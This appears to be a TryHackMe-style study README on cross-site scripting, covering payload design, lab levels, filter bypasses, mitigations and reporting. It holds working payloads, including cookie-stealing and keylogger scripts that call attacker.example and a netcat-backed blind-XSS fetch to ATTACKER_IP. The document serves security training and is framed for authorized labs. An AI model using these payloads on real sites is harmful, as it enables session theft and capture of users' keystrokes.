## Definition — What is a payload?

A **payload** in XSS is the JavaScript (or data) you want executed in the victim’s browser. The payload’s goal varies — from demonstrating a vulnerability to exfiltrating data or manipulating application logic.

**Concise definition:**

> Payload = the JavaScript (or executable content) you inject so that it executes inside a target page in a victim’s browser.

---

## Components of a payload: Intention and Modification

A payload consists of two conceptual parts:

- **Intention:** What the code should _do_. Examples: show a proof-of-concept alert, send the cookie to an attacker, log keystrokes, call an application function.
    
- **Modification:** How the payload must be changed to _work in the specific reflection context_. This includes escaping, closing tags, using event attributes, encoding, inserting delimiters or comments, or using polyglots.
    

Always separate: first design the intention, then craft the modification to match the context where the input is reflected.

---

## Common XSS Intentions — Examples

### Proof of Concept (Benign)

```html
<script>alert('XSS');</script>
```

Purpose: demonstrate execution without impact.

### Session Stealing (Illustrative)

```html
<script>
  fetch('https://attacker.example/steal?cookie=' + btoa(document.cookie));
</script>
```

Purpose: exfiltrate cookies. **Do not run against live third-party sites.** Use only in authorized lab.

### Key Logger (Illustrative)

```html
<script>
document.onkeypress = function(e) {
  fetch('https://attacker.example/log?key=' + btoa(e.key));
}
</script>
```

Purpose: forward typed input to an attacker-controlled endpoint.

### Business Logic Manipulation (Illustrative)

```html
<script>
  user.changeEmail('attacker@attacker.example');
</script>
```

Purpose: call internal JS functions to change application state.

---

## XSS Types — Scenarios & Impact

### Reflected XSS

- **What:** Input from an HTTP request is immediately reflected in the response and executed.
    
- **Example scenario:** error message shows `?error=` content without sanitization.
    
- **Impact:** Attackers can craft links to execute JS in victim browsers (phishing, session theft).
    

### Stored XSS

- **What:** Malicious input is stored (DB) and served to other users later.
    
- **Example scenario:** comments, profile bio, support tickets that are not sanitized.
    
- **Impact:** Wide distribution; any user viewing page will execute payload.
    

### Blind XSS

- **What:** Payload is stored and executed in a context the attacker cannot directly see (e.g., admin UI). The attacker relies on callbacks to detect execution.
    
- **Example scenario:** A contact form message stored as a ticket viewed by staff in a private panel.
    
- **Impact:** Very high risk because it can reach administrative contexts with elevated capabilities.
    

---

## How to test for Reflected XSS

Test every possible reflection point:

- URL query string parameters
    
- Path segments (e.g., `/search/<input>`)
    
- Form inputs that echo content back in the response
    
- Some HTTP headers (rarely exploitable in practice)  
    Method:
    

1. Locate reflection by sending unique string (e.g., `INJECT_HERE`) then view page source.
    
2. Replace with `alert()` PoC or context-specific payload to confirm execution.
    
3. Record where the payload appears in HTML (body, attribute, JS context, value, textarea, etc.)
    

---

## How to test for Stored XSS

Check places where user input is persisted:

- Comments, reviews, forum posts
    
- Profile fields (bio, display name)
    
- Listings (product descriptions)
    
- Administrative fields (notes, ticket messages)  
    Method: insert PoC into storage field, then view the page as other roles or accounts; if possible, inspect how content is reflected in HTML or admin interfaces.
    

---

## Blind XSS — strategy & payloads

Because you cannot immediately see the result:

- Use payloads that make an outbound HTTP request (callback) to your server.
    
- Use registered “catcher” services (for authorized testing) or your own listener.
    
- Include context info in callback (e.g., `?url=` + encodeURIComponent(location.href) + `&cookie=` + btoa(document.cookie))
    

**Example blind callback payload:**

```html
</textarea><script>
  fetch('http://YOUR_IP:PORT/log?u=' + encodeURIComponent(location.href) + '&c=' + btoa(document.cookie));
</script>
```

---

## Lab-style levels (1 → 6) , payloads, and why they work

> These are lab exercises similar to typical CTF/learning platforms. Use only in authorized labs.

### Level One — Reflected into HTML body text

- **Context:** Name field is reflected directly into page body (plain HTML text).
    
- **Observed page source:** `... Hello, [NAME] ...`
    
- **Payload:**
    

```html
<script>alert('THM');</script>
```

- **Why it works:** The input is output verbatim in the HTML body; a `<script>` tag executes.
    

---

### Level Two — Reflected into an input value attribute

- **Context:** Name is placed inside `value="..."`
    
- **Observed page source:** `<input type="text" value="[NAME]" />`
    
- **Naive payload fails:** `<script>...</script>` will be inside `value` attribute and treated as text.
    
- **Escape-based payload:**
    

```html
"><script>alert('THM');</script>
```

- **Why it works:** `">` closes the value attribute and the tag, allowing insertion of a `<script>` element.
    

---

### Level Three — Reflected inside `<textarea>`

- **Context:** Name is inserted inside `<textarea>[NAME]</textarea>`
    
- **Escape-based payload:**
    

```html
</textarea><script>alert('THM');</script>
```

- **Why it works:** Closing the textarea early lets the injected `<script>` run.
    

---

### Level Four — Reflected inside inline JavaScript

- **Context:** The name is concatenated into JavaScript, e.g.: `var name = 'USER_INPUT'; doSomething(name);`
    
- **Payload idea:** Break out of JS string and add command:
    

```html
';alert('THM');//
```

- **Why it works:** `'` closes the string, `;` ends current statement, `alert()` executes, `//` comments out remainder.
    

---

### Level Five — Filters stripping dangerous words (e.g., `script`)

- **Context:** Filter removes `script` occurrences or strips `<` and `>`.
    
- **Bypass trick:** Overwrite or obfuscate the word so filter removes part but final string is valid:
    
    - Submit: `<sscriptcript>alert('THM');</sscriptcript>`
        
    - Filter removes `sscriptcript` (or modifies), leaving `<script>...`
        
- **Why it works:** Filters often remove blacklisted substrings, but clever duplication or splitting can recompose a valid tag after filtering.
    

---

### Level Six — Angle bracket filtration but attributes allowed

- **Context:** `<` and `>` are filtered out, but attribute injection into existing tag is possible.
    
- **Technique:** Inject a new attribute into an existing tag that executes (e.g., `img` `onload`):
    
- **Payload example (inside attribute reflection):**
    

```
/images/cat.jpg" onload="alert('THM');
```

- **Why it works:** The page builds an `img` tag using your string as `src`; adding `onload` attaches JS which executes when image is processed.
    

---

## Polyglots

- **Definition:** A polyglot is a single string designed to work across many contexts (attributes, tags, JS contexts) and bypass filters.
    
- **Use-case:** Useful in CTFs and broad testing when you don’t know the exact sink/context.
    
- **Example polyglot (complex; lab-only):**
    

```
`jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A//</stYle/...
```

(Real polyglots may be long and use many encodings/terminations to survive filters.)

---

## Blind XSS Practical — Netcat listener + exfil payload (step-by-step)

**Goal:** Verify code executes in staff/admin interface you cannot view by receiving a callback.

**1) Start a netcat listener on your attack box:**

```bash
# XSS (Cross-Site Scripting) (THM)
nc -nlvp 9001
# or nc -n -l -v -p 9001
```

**2) Construct the payload** (replace `ATTACKER_IP:9001`):

```html
</textarea><script>
  fetch('http://ATTACKER_IP:9001/?cookie=' + btoa(document.cookie) + '&url=' + encodeURIComponent(location.href));
</script>
```

**3) Submit payload in the blind input** (contact form, ticket, etc.) that will be viewed by staff.

**4) Monitor netcat terminal.** If staff browser executes payload, netcat receives an HTTP GET with base64 cookie and page URL.

**5) Decode cookie (if authorized lab):**  
Use base64 decoder to convert `btoa(document.cookie)` back to human-readable. Example CLI:

```bash
# On captured cookie value (example: Q29va2llPW...):
echo 'Q29va2llPW...' | base64 -d
```

**Important notes & ethics:**

- Do this **only** in lab environments or where you have explicit permission to simulate exfiltration.
    
- Do not exfiltrate real user data from production unless contractually authorized and scope-limited.
    

---

## Payload crafting & modification techniques (context-aware)

Choose modification technique according to where input is reflected:

- **Body text:** insert full `<script>...</script>` if allowed.
    
- **Attribute value:** break out of attribute with `">` or `'"` depending on attribute quoting.
    
- **Unquoted attribute:** you can inject space followed by `onerror=` or `onmouseover=`.
    
- **Inside `<textarea>`:** close with `</textarea>` then add script.
    
- **Inside JS string:** close string `'` or `"` then add `;yourCode;//`.
    
- **When `<`/`>` removed:** rely on event handlers already present in allowed tags (e.g., add `onerror=...` to an `img` src), or use `javascript:` URIs if allowed.
    
- **When words filtered:** split or obfuscate keywords, use encoded characters like `\x3c` for `<` or HTML entity encoding `&lt;`.
    
- **When injection is sanitized but DOM-based sinks exist:** consider DOM XSS vectors (e.g., `location.hash`, `document.write` sinks in client scripts).
    

---

## Common filters and bypass techniques

- **Filter:** remove `<` and `>`  
    **Bypass:** use event handler injection into existing tags or use JS URLs if allowed.
    
- **Filter:** strip `script` or `onerror` strings  
    **Bypass:** split string or duplicate parts so filter removes pieces but leaves valid output (e.g., `<s` + `cript>` technique).
    
- **Filter:** escape HTML special characters to entities  
    **Bypass:** try double-decoding, alternate encodings, or target contexts where decoding happens (rare and often fragile).
    
- **Filter:** content-length or allowed character set restrictions  
    **Bypass:** use shorter payloads (e.g., `img src=x onerror=alert(1)`).
    

---

## Testing checklist (safe & authorized)

Before testing:

- Obtain written permission (scope, targets, allowed techniques).
    
- Use isolated test accounts and test data when possible.
    
- Notify stakeholders if required by policy.
    

During testing:

- Use safe PoC first: `alert('POC')`.
    
- Move to impact assessment if in scope.
    
- For blind XSS, use controlled callback endpoints and log only minimal info required for verification.
    

After testing:

- Preserve evidence: HTTP requests (raw), responses, screenshots, page source.
    
- Remove any test artifacts you control (credentials, test accounts) if required.
    
- Follow responsible disclosure.
    

---

## Evidence gathering & reporting template

**Title:** Reflected XSS in `<page/endpoint>` — Parameter: `error` (example)  
**Description:** Reflected XSS where user-supplied `error` parameter is reflected unsafely in HTML body.  
**Steps to reproduce:**

1. Visit: `https://target.example/page?error=<script>alert('POC')</script>`
    
2. Observe: alert box appears and page source shows injected script.
    

**PoC (encoded):**

```
GET /page?error=%3Cscript%3Ealert('POC')%3C/script%3E HTTP/1.1
Host: target.example
```

**Impact:** Session theft, data exfiltration, CSRF bypass, account takeover (depending on context).  
**Remediation recommendation:** Apply context-aware output encoding, use HTTPOnly cookies, implement CSP, sanitize inputs.  
**Attachments:** Page source snippet, screenshot of alert, HTTP request/response logs.

---

## Mitigations & secure development practices

1. **Contextual output encoding:** Encode output depending on sink — HTML body, attribute, JavaScript, CSS, URL. Use established libraries.
    
2. **Input validation (as defense-in-depth):** Validate type/length; but do not rely on whitelist-only client-side validation.
    
3. **Use safe templating frameworks:** They automatically escape output by default (but still be careful with `innerHTML` or `eval` usage).
    
4. **Set cookies `HttpOnly` and `Secure`:** Prevent JavaScript access to session cookies.
    
5. **Implement CSP (Content Security Policy):** Disallow `unsafe-inline`; restrict script sources; use nonces or hashes for allowed inline scripts.
    
6. **Avoid unsafe JavaScript sinks:** Don’t include untrusted data in `eval()`, `innerHTML`, `document.write` when possible.
    
7. **Audit third-party scripts:** They can introduce DOM XSS sinks or be hijacked.
    
8. **Sanitize stored content for admin UIs:** Even logs and admin tools must escape content before rendering.
    
9. **Security testing & code review:** Include XSS checks in CI/security review.
    
10. **Least privilege & monitoring:** Short sessions, re-auth for sensitive actions, and detect unusual outbound connections.
    

---

## Appendix: Quick payload cheat-sheet (for labs)

**Basic PoC (body)**

```html
<script>alert('POC');</script>
```

**Break out of attribute**

```html
"><script>alert('POC');</script>
```

**Break out of textarea**

```html
</textarea><script>alert('POC');</script>
```

**Break out of JS string**

```html
';alert('POC');// 
```

**Image onerror**

```html
<img src=x onerror="alert('POC')">
```

**Blind exfil (fetch to your listener)**

```html
</textarea><script>
  fetch('http://ATTACKER_IP:9001/?cookie=' + btoa(document.cookie) + '&u=' + encodeURIComponent(location.href));
</script>
```

**Polyglot (example — lab only)**  
A single long string that attempts many contexts; use CTF/lab-provided polyglots.

---

## Closing notes & ethics

- XSS payloads are powerful and dangerous when used maliciously. This README is for education and authorized testing only.
    
- Always follow legal boundaries, scope agreements, and responsible disclosure policies.
    
- Use benign PoCs first; escalate only with explicit permission.
    

---